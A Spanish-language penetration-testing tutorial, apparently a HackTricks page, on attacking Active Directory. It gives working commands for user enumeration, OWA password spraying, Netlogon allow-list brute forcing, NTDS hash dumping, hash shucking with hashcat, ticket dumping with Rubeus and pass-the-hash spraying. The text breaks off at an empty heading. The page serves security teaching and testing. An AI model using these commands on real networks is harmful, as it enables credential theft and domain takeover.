# Metodología de Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Descripción general básica

**Active Directory** sirve como una tecnología fundamental que permite a los **administradores de red** crear y gestionar eficazmente **dominios**, **usuarios** y **objetos** dentro de una red. Está diseñado para escalar, facilitando la organización de un gran número de usuarios en **grupos** y **subgrupos** manejables, mientras controla los **derechos de acceso** en distintos niveles.

La estructura de **Active Directory** está compuesta por tres capas principales: **dominios**, **árboles** y **bosques**. Un **dominio** abarca una colección de objetos, como **usuarios** o **dispositivos**, que comparten una base de datos común. Los **árboles** son grupos de estos dominios vinculados mediante una estructura compartida, y un **bosque** representa la colección de varios árboles interconectados mediante **relaciones de confianza**, formando la capa superior de la estructura organizativa. Se pueden designar **derechos de acceso** y **comunicación** específicos en cada uno de estos niveles.

Los conceptos clave de **Active Directory** incluyen:

1. **Directory**: almacena toda la información relacionada con los objetos de Active Directory.
2. **Object**: representa entidades dentro del directorio, incluidos **usuarios**, **grupos** o **carpetas compartidas**.
3. **Domain**: sirve como contenedor para los objetos del directorio, con la capacidad de que varios dominios coexistan dentro de un **bosque**, manteniendo cada uno su propia colección de objetos.
4. **Tree**: agrupación de dominios que comparten un dominio raíz común.
5. **Forest**: el nivel superior de la estructura organizativa de Active Directory, compuesto por varios árboles con **relaciones de confianza** entre ellos.

**Active Directory Domain Services (AD DS)** engloba una serie de servicios fundamentales para la gestión y comunicación centralizadas dentro de una red. Estos servicios incluyen:

1. **Domain Services**: centraliza el almacenamiento de datos y gestiona las interacciones entre **usuarios** y **dominios**, incluidas las funciones de **autenticación** y **búsqueda**.
2. **Certificate Services**: supervisa la creación, distribución y gestión de **certificados digitales** seguros.
3. **Lightweight Directory Services**: permite que las aplicaciones habilitadas para directorios utilicen el **protocolo LDAP**.
4. **Directory Federation Services**: proporciona capacidades de **single-sign-on** para autenticar usuarios en varias aplicaciones web dentro de una única sesión.
5. **Rights Management**: ayuda a proteger material sujeto a copyright regulando su distribución y uso no autorizados.
6. **DNS Service**: es fundamental para la resolución de **nombres de dominio**.

Para obtener una explicación más detallada, consulta: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Para aprender a **atacar un AD**, necesitas **entender** muy bien el **proceso de autenticación de Kerberos**.\
[**Lee esta página si aún no sabes cómo funciona.**](kerberos-authentication.md)

## Cheat Sheet

Puedes consultar [https://wadcoms.github.io/](https://wadcoms.github.io) para obtener una vista rápida de los comandos que puedes ejecutar para enumerar/explotar un AD.

> [!WARNING]
> La comunicación Kerberos normalmente **requiere un nombre de dominio completo (FQDN)** para que el cliente pueda obtener un ticket para el SPN correcto. Acceder a una máquina mediante su dirección IP normalmente hace que se use NTLM en lugar de Kerberos.

## Reconocimiento de Active Directory (sin creds/sesiones)

Si solo tienes acceso a un entorno AD, pero no tienes credenciales/sesiones, podrías:

- **Hacer Pentest de la red:**
- Escanear la red, encontrar máquinas y puertos abiertos e intentar **explotar vulnerabilidades** o **extraer credenciales** de ellas (por ejemplo, [las impresoras pueden ser objetivos muy interesantes](ad-information-in-printers.md)).
- Enumerar DNS podría proporcionar información sobre servidores clave del dominio, como web, impresoras, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consulta la [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) general para obtener más información sobre cómo hacerlo.
- **Comprobar el acceso null y Guest en los servicios smb** (esto no funcionará en versiones modernas de Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Aquí encontrarás una guía más detallada sobre cómo enumerar un servidor SMB:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerar Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Aquí encontrarás una guía más detallada sobre cómo enumerar LDAP (presta **especial atención al acceso anónimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Envenenar la red**
- Recopilar credenciales [**suplantando servicios con Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Obtener acceso al host [**abusando del relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Recopilar credenciales **exponiendo** [**servicios UPnP falsos con evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extraer nombres de usuario/nombres de documentos internos, redes sociales y servicios (principalmente web) dentro de los entornos del dominio, así como de fuentes disponibles públicamente.
- Si encuentras los nombres completos de los empleados de una empresa, podrías probar distintas **convenciones de nombres de usuario de AD (**[**lee esto**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Las convenciones más comunes son: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada uno), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _letras aleatorias y 3 números aleatorios_ (abc123).
- Herramientas:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeración de usuarios

- **Enumeración SMB/LDAP anónima:** consulta las páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) y [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeración con Kerbrute**: cuando se solicita un **nombre de usuario no válido**, el servidor responde utilizando el código de **error de Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, lo que permite determinar que el nombre de usuario no es válido. Los **nombres de usuario válidos** provocarán como respuesta el **TGT en una respuesta AS-REP** o el error _KRB5KDC_ERR_PREAUTH_REQUIRED_, que indica que el usuario debe realizar la preautenticación.
- **Sin autenticación contra MS-NRPC**: utilizar auth-level = 1 (sin autenticación) contra la interfaz MS-NRPC (Netlogon) de los controladores de dominio. El método llama a la función `DsrGetDcNameEx2` después de enlazar con la interfaz MS-NRPC para comprobar si el usuario o el equipo existen sin credenciales. La herramienta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa este tipo de enumeración. La investigación se puede consultar [aquí](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Servidor OWA (Outlook Web Access)**

Si encontraste uno de estos servidores en la red, también puedes realizar **enumeración de usuarios contra él**. Por ejemplo, podrías usar la herramienta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puedes encontrar listas de nombres de usuario en [**este repositorio de github**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  y en este otro ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Sin embargo, deberías tener los **nombres de las personas que trabajan en la empresa** a partir del paso de recon que deberías haber realizado antes de esto. Con el nombre y el apellido, podrías usar el script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para generar posibles nombres de usuario válidos.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Incluso después de aplicar el parche de **Zerologon** en el DC, las cuentas incluidas explícitamente en la allow-list todavía pueden quedar expuestas al comportamiento **legacy/vulnerable** del secure channel de Netlogon. La configuración de riesgo es la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** o el valor de registro correspondiente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ese valor es un **security descriptor SDDL** (consulta [Security Descriptors](security-descriptors.md)). Cualquier cuenta o grupo al que se le haya concedido el ACE correspondiente en la DACL puede ser objetivo. Por ejemplo, `O:BAG:BAD:(A;;RC;;;WD)` incluye efectivamente a **Everyone** en la allow-list.

Flujo de trabajo práctico del operador:

1. **Identificar los principals incluidos en la allow-list** comprobando tanto **SYSVOL/GPO** como el registro activo del **DC**.
2. **Resolver los SID** encontrados en el SDDL para identificar los usuarios/equipos reales de AD y priorizar las **cuentas de máquina de los DC**, las **cuentas de confianza** y otras máquinas privilegiadas.
3. Intentar repetidamente la **autenticación MS-NRPC / Netlogon** como la cuenta incluida en la allow-list.
4. Tras realizar una adivinación correcta, abusar de **Netlogon password-setting** para restablecer la contraseña de la cuenta objetivo (el PoC público la establece como una cadena vacía).<sup>[[9]](#references)[[10]](#references)</sup>

Ejemplos rápidos de triage / laboratorio del artefacto público:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notas:

- El **scanner** es útil porque la allow-list efectiva puede existir en **SYSVOL**, en el **registry** o en ambos.
- La propia ruta de exploit es importante porque **no requiere privilegios de Domain Admin** una vez identificada una cuenta vulnerable.
- Comprometer una **cuenta de máquina de un Domain Controller**, como `DC$`, es especialmente peligroso porque restablecer esa contraseña puede habilitar directamente rutas más amplias de **toma de control de AD**.
- La viabilidad de la **fuerza bruta** depende del modo: el artefacto público describe un enfoque meet-in-the-middle, una fuerza bruta de **24 bits** cuando hay otra cuenta de equipo disponible y variantes de **32 bits** más lentas.

Notas de detección y hardening:

- Audita la política de allow-list y elimina todo excepto las excepciones temporales de compatibilidad requeridas explícitamente.
- Monitoriza los eventos **5827/5828/5829/5830/5831** del **System** de los DC para detectar conexiones vulnerables de Netlogon que sean denegadas, descubiertas o permitidas explícitamente por la política.
- Trata las cuentas de `VulnerableChannelAllowList` como de **alto riesgo** hasta eliminar la dependencia legacy.

### Conocer uno o varios nombres de usuario

De acuerdo, sabes que ya tienes un nombre de usuario válido, pero no tienes contraseñas... Entonces prueba lo siguiente:

- [**ASREPRoast**](asreproast.md): Si un usuario **no tiene** el atributo _DONT_REQ_PREAUTH_, puedes **solicitar un mensaje AS_REP** para ese usuario que contendrá algunos datos cifrados mediante una derivación de la contraseña del usuario.
- [**Password Spraying**](password-spraying.md): Probemos las **contraseñas más comunes** con cada uno de los usuarios descubiertos; quizá algún usuario esté utilizando una contraseña débil (¡ten en cuenta la política de contraseñas!).
- Ten en cuenta que también puedes hacer **spraying contra servidores OWA** para intentar obtener acceso a los servidores de correo de los usuarios.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Es posible que puedas **obtener** algunos **hashes** de challenge haciendo **poisoning** de algunos protocolos de la **red**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

La enumeración de Active Directory proporciona cuentas, hosts y servicios candidatos que pueden ser forzados a autenticarse. Utiliza ese contexto para identificar [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) viables de NTLM y posibles rutas hacia el entorno de AD.

### NetExec: reconocimiento basado en workspaces y comprobaciones de la postura de relay

- Utiliza **workspaces de `nxcdb`** para mantener el estado del reconocimiento de AD por engagement: `workspace create <name>` genera bases de datos SQLite por protocolo en `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia de vista con `proto smb|mssql|winrm` y enumera los secretos recopilados con `creds`. Elimina manualmente los datos sensibles cuando termines: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- El descubrimiento rápido de subredes con **`netexec smb <cidr>`** muestra el **dominio**, la **compilación del SO**, los **requisitos de firma SMB** y **Null Auth**. Los miembros que muestran `(signing:False)` son **vulnerables a relay**, mientras que los DC suelen requerir firma.
- Genera **nombres de host en /etc/hosts** directamente a partir de la salida de NetExec para facilitar el targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Cuando **SMB relay al DC está bloqueado** debido a signing, sigue comprobando la postura de **LDAP**: `netexec ldap <dc>` muestra `(signing:None)` / channel binding débil. Un DC con SMB signing obligatorio pero LDAP signing deshabilitado sigue siendo un objetivo viable de **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Client-side printer credential leaks → validación masiva de credenciales de dominio

- En ocasiones, las interfaces web/de impresoras **incluyen passwords de administrador enmascaradas en HTML**. Ver el código fuente o usar devtools puede revelar el texto claro (por ejemplo, `<input value="<password>">`), lo que permite acceder mediante Basic-auth a repositorios de escaneo/impresión.
- Los trabajos de impresión recuperados pueden contener **documentos de incorporación en plaintext** con passwords por usuario. Mantén las correspondencias alineadas al realizar las pruebas:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Si puedes **acceder a otros PCs o shares** con el **usuario null o guest**, podrías **colocar archivos** (como un archivo SCF) que, si se accede a ellos de alguna manera, **disparen una autenticación NTLM contra ti**, de modo que puedas **robar** el **desafío NTLM** para crackearlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata cada hash NT que ya posees como una contraseña candidata para otros formatos más lentos cuyo material criptográfico se deriva directamente del hash NT. En lugar de aplicar fuerza bruta a passphrases largas en tickets Kerberos RC4, desafíos NetNTLM o credenciales cacheadas, proporcionas los hashes NT a los modos NT-candidate de Hashcat y permites que valide la reutilización de contraseñas sin obtener nunca el texto plano. Esto es especialmente potente después de comprometer un dominio, cuando puedes recolectar miles de hashes NT actuales e históricos.<sup>[[5]](#references)</sup>

Usa shucking cuando:

- Tienes un corpus NT procedente de volcados de DCSync, SAM/SECURITY o credential vaults y necesitas comprobar su reutilización en otros dominios/forests.
- Capturas material Kerberos basado en RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respuestas NetNTLM o blobs DCC/DCC2.
- Quieres demostrar rápidamente la reutilización de passphrases largas que no se pueden crackear e inmediatamente pivotar mediante Pass-the-Hash.

La técnica **no funciona** contra tipos de cifrado cuyas claves no son el hash NT (por ejemplo, Kerberos etype 17/18 AES). Si un dominio aplica únicamente AES, debes volver a los modos de contraseña normales.

#### Construcción de un corpus de hashes NT

- **DCSync/NTDS** – Usa `secretsdump.py` con el historial para obtener el conjunto más grande posible de hashes NT (y sus valores anteriores):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Las entradas del historial amplían considerablemente el conjunto de candidatos porque Microsoft puede almacenar hasta 24 hashes anteriores por cuenta. Para conocer más formas de recolectar secretos NTDS, consulta:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) extrae datos SAM/SECURITY locales y logons de dominio cacheados (DCC/DCC2). Elimina duplicados y añade esos hashes a la misma lista `nt_candidates.txt`.
- **Track metadata** – Conserva el username/domain que produjo cada hash (aunque la wordlist solo contenga valores hexadecimales). Los hashes coincidentes te indican inmediatamente qué principal está reutilizando una contraseña cuando Hashcat muestre el candidato ganador.
- Da preferencia a candidatos del mismo forest o de un forest de confianza; esto maximiza la probabilidad de coincidencia al realizar shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- Las entradas NT-candidate **deben permanecer como hashes NT sin procesar de 32 caracteres hexadecimales**. Desactiva los motores de reglas (sin `-r` ni modos híbridos) porque la modificación corrompe el material criptográfico de la clave candidata.
- Estos modos no son inherentemente más rápidos, pero el keyspace de NTLM (~30.000 MH/s en un M3 Max) es aproximadamente 100 veces más rápido que Kerberos RC4 (~300 MH/s). Probar una lista NT seleccionada es mucho más barato que explorar todo el espacio de contraseñas en el formato lento.
- Ejecuta siempre la **versión más reciente de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) porque los modos 31500/31600/35300/35400 se incorporaron recientemente.<sup>[[7]](#references)</sup>
- Actualmente no existe un modo NT para AS-REQ Pre-Auth, y los etypes AES (19600/19700) requieren la contraseña en texto plano porque sus claves se derivan mediante PBKDF2 a partir de contraseñas UTF-16LE, no de hashes NT sin procesar.

#### Ejemplo – Kerberoast RC4 (modo 35300)

1. Captura un TGS RC4 para un SPN objetivo con un usuario de bajos privilegios (consulta la página de Kerberoast para más información):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Realiza shucking del ticket con tu lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la clave RC4 de cada candidato NT y valida el blob `$krb5tgs$23$...`. Una coincidencia confirma que la cuenta de servicio utiliza uno de tus hashes NT existentes.

3. Pivota inmediatamente mediante PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcionalmente, puedes recuperar el texto plano más tarde con `hashcat -m 1000 <matched_hash> wordlists/` si lo necesitas.

#### Ejemplo – Credenciales cacheadas (modo 31600)

1. Extrae los logons cacheados de una workstation comprometida:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la línea DCC2 del usuario del dominio de interés en `dcc2_highpriv.txt` y realiza shucking:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una coincidencia exitosa produce el hash NT ya conocido en tu lista, demostrando que el usuario cacheado está reutilizando una contraseña. Úsalo directamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) o aplica fuerza bruta en el modo NTLM rápido para recuperar la cadena.

El mismo workflow se aplica a challenge-responses NetNTLM (`-m 27000/27100`) y DCC (`-m 31500`). Una vez identificada una coincidencia, puedes lanzar relay, PtH mediante SMB/WMI/WinRM o volver a crackear el hash NT con masks/rules offline.



## Enumerating Active Directory WITH credentials/session

Para esta fase necesitas haber **comprometido las credenciales o una sesión de una cuenta de dominio válida**. Si tienes credenciales válidas o una shell como usuario del dominio, **debes recordar que las opciones indicadas anteriormente siguen siendo opciones para comprometer a otros usuarios**.

Antes de comenzar la enumeración autenticada, comprende el **problema del double-hop de Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Comprometer una cuenta es un **paso importante para evaluar el dominio**, porque permite realizar una **enumeración autenticada de Active Directory**:

En cuanto a [**ASREPRoast**](asreproast.md), ahora puedes encontrar todos los usuarios potencialmente vulnerables; y respecto al [**Password Spraying**](password-spraying.md), puedes obtener una **lista de todos los usernames** y probar la contraseña de la cuenta comprometida, contraseñas vacías y nuevas contraseñas prometedoras.

- Puedes usar [**CMD para realizar un recon básico**](../basic-cmd-for-pentesters.md#domain-info)
- También puedes usar [**powershell para recon**](../basic-powershell-for-pentesters/index.html), lo que será más stealthy
- También puedes [**usar powerview**](../basic-powershell-for-pentesters/powerview.md) para extraer información más detallada
- Otra herramienta excelente para hacer recon en un active directory es [**BloodHound**](bloodhound.md). **No es muy stealthy** (dependiendo de los métodos de recolección que uses), pero **si no te importa**, deberías probarla. Encuentra dónde pueden hacer RDP los usuarios, encuentra rutas hacia otros grupos, etc.
- **Otras herramientas automatizadas de enumeración de AD son:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Registros DNS del AD**](ad-dns-records.md), ya que podrían contener información interesante.
- Una **herramienta con GUI** que puedes usar para enumerar el directorio es **AdExplorer.exe**, de la suite **SysInternal**.
- También puedes buscar en la base de datos LDAP con **ldapsearch** para encontrar credenciales en los campos _userPassword_ y _unixUserPassword_, o incluso en _Description_. Consulta [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para conocer otros métodos.
- Si usas **Linux**, también podrías enumerar el dominio mediante [**pywerview**](https://github.com/the-useless-one/pywerview).
- También puedes probar herramientas automatizadas como:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracción de todos los usuarios del dominio**

Es muy fácil obtener todos los usernames del dominio desde Windows (`net user /domain`, `Get-DomainUser` o `wmic useraccount get name,sid`). En Linux, puedes usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Aunque esta sección de Enumeration parezca pequeña, es la parte más importante de todo el proceso. Accede a los enlaces (principalmente los de cmd, powershell, powerview y BloodHound), aprende a enumerar un dominio y practica hasta sentirte cómodo. Durante un assessment, este será el momento clave para encontrar el camino hacia DA o decidir que no se puede hacer nada.

### Kerberoast

Kerberoasting consiste en obtener **tickets TGS** utilizados por servicios vinculados a cuentas de usuario y crackear su cifrado —que se basa en las contraseñas de los usuarios— **offline**.

Más información sobre esto en:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

Una vez que hayas obtenido algunas credenciales, puedes comprobar si tienes acceso a alguna **máquina**. Para ello, puedes usar **CrackMapExec** para intentar conectarte a varios servidores mediante distintos protocolos, según los puertos identificados en tus scans.

### Local Privilege Escalation

Si has comprometido credenciales o una sesión como usuario normal del dominio y puedes acceder a **cualquier máquina del dominio**, busca una ruta para **escalar privilegios localmente y recolectar credenciales**. Los privilegios de administrador local pueden permitirte **extraer los hashes de otros usuarios** de la memoria (LSASS) y del almacenamiento local (SAM).

Hay una página completa en este libro sobre [**local privilege escalation en Windows**](../windows-local-privilege-escalation/index.html) y un [**checklist**](../checklist-windows-privilege-escalation.md). Además, no olvides usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Es muy **poco probable** que encuentres **tickets** en el **usuario actual** que te **den permiso para acceder** a recursos inesperados, pero puedes comprobarlo:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Con credenciales de dominio o una sesión de usuario, vuelve a revisar los [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) de NTLM: las técnicas de enumeración autenticada y coerción pueden exponer rutas de relay que no estaban disponibles durante el reconocimiento no autenticado.

### Busca Creds en Computer Shares | SMB Shares

Ahora que tienes algunas credenciales básicas, deberías comprobar si puedes **encontrar** **archivos interesantes compartidos dentro del AD**. Podrías hacerlo manualmente, pero es una tarea muy aburrida y repetitiva (y aún más si encuentras cientos de documentos que debes revisar).

[**Sigue este enlace para conocer las herramientas que podrías usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Robar Creds NTLM

Si puedes **acceder a otros PCs o shares**, podrías **colocar archivos** (como un archivo SCF) que, si alguien accede a ellos de alguna forma, **d**esencadenen una **autenticación NTLM contra ti**, para que puedas **robar** el **desafío NTLM** y crackearlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidad permitía a cualquier usuario autenticado **comprometer el controlador de dominio**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalada de privilegios en Active Directory CON credenciales/sesión privilegiadas

**Para las siguientes técnicas, un usuario de dominio normal no es suficiente; necesitas privilegios/credenciales especiales para realizar estos ataques.**

### Extracción de hashes

Con suerte, has conseguido **comprometer alguna cuenta de administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), incluido el relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalada de privilegios local](../windows-local-privilege-escalation/index.html).\
Entonces, es hora de volcar todos los hashes de la memoria y del sistema local.\
[**Lee esta página sobre las distintas formas de obtener los hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una vez que tienes el hash de un usuario**, puedes usarlo para **suplantarlo**.\
Necesitas usar alguna **tool** que **realice** la **autenticación NTLM usando** ese **hash**, **o** puedes crear una nueva **sessionlogon** e **inyectar** ese **hash** dentro de **LSASS**, de modo que cuando se realice cualquier **autenticación NTLM**, se **utilice ese hash**. La última opción es lo que hace mimikatz.\
[**Lee esta página para obtener más información.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque tiene como objetivo **usar el hash NTLM del usuario para solicitar tickets Kerberos**, como alternativa al método común Pass The Hash sobre el protocolo NTLM. Por lo tanto, esto puede ser especialmente **útil en redes donde el protocolo NTLM está deshabilitado y solo se permite Kerberos** como protocolo de autenticación.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

En el método de ataque **Pass The Ticket (PTT)**, los atacantes **roban el ticket de autenticación de un usuario** en lugar de su contraseña o sus valores hash. Este ticket robado se utiliza después para **suplantar al usuario**, obteniendo acceso no autorizado a recursos y servicios dentro de una red.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Reutilización de credenciales

Si tienes el **hash** o la **contraseña** de un **administrador local**, deberías intentar **iniciar sesión localmente** en otros **PCs** con ella.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Ten en cuenta que esto es bastante **ruidoso** y **LAPS** lo **mitigaría**.

### Abuso de MSSQL y Trusted Links

Si un usuario tiene privilegios para **acceder a instancias MSSQL**, podría utilizarlos para **ejecutar comandos en el host MSSQL** (si se ejecuta como SA), **robar** el **hash** de NetNTLM o incluso realizar un **ataque** de **relay**.\
Si una instancia MSSQL tiene una relación de confianza mediante un vínculo de base de datos con otra instancia, un usuario con privilegios sobre la base de datos vinculada podría **utilizar la relación de confianza para ejecutar consultas en la otra instancia**. Estas relaciones de confianza pueden encadenarse y eventualmente alcanzar una base de datos mal configurada donde el usuario pueda ejecutar comandos.\
**Los vínculos entre bases de datos funcionan incluso a través de relaciones de confianza entre forests.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso de plataformas de inventario/despliegue de IT

Las suites de inventario y despliegue de terceros suelen exponer rutas potentes hacia las credenciales y la ejecución de código. Consulta:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

